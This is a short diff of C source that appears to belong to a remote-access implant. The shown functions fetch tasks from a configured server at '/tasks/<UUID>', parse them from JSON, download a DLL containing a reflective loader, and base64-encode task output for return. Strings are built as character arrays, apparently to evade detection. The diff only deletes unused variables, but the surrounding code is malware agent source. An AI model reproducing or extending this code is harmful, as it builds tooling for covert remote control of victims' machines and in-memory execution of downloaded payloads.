@@ -184,7 +184,6 @@ CHAR* getToken(PAPI api, Tokens tokens, DWORD index)
     }
 
     CHAR* token = tokens.tokenizedString;
-    DWORD dwOffsetToNextToken = 0;
     for (DWORD i = 0; i < index; i++)
     {
         // (size of a token + null byte) gives us the offset to reach the next token
@@ -407,7 +406,6 @@ Task readJsonTask(PAPI api, CHAR* json)
 
     CHAR* tmpJson = json;  // myStrtok modifies the string itself
     CHAR delim = { '\n' };
-    CHAR blacklist[] = { '[', ']', '\0' };
     // tokenize json
     Tokens tokensStruct = myStrtok(api, tmpJson, delim);
 
@@ -627,11 +625,8 @@ void myMain()
     // downloaded DLL with the reflective loader in it
     DLL primalDll;
     PDLL pPrimalDll = &primalDll;
-    pPrimalDll->pBuffer = NULL;
 
     WCHAR wServer[] = { SERVER_M } ;
-    WCHAR tasksPath[] = { '/', 't', 'a', 's', 'k', 's', '/', 0 };
-    WCHAR uuid[] = { UUID_M } ;
     INTERNET_PORT port = PORT_M;
 
     #ifdef DEBUG
@@ -674,9 +669,7 @@ void myMain()
     WCHAR fullPath[] = { '/', 't', 'a', 's', 'k', 's', '/', UUID_M };
 
     CHAR* jsonResponse = NULL;
-    CHAR* decodedTaskParams = NULL;
     CHAR* orgOutput = NULL;
-    DWORD taskSize;
     CHAR* taskOutput;
     CHAR* b64EncodedOutput;
     DWORD b64EncodedOutputSize;
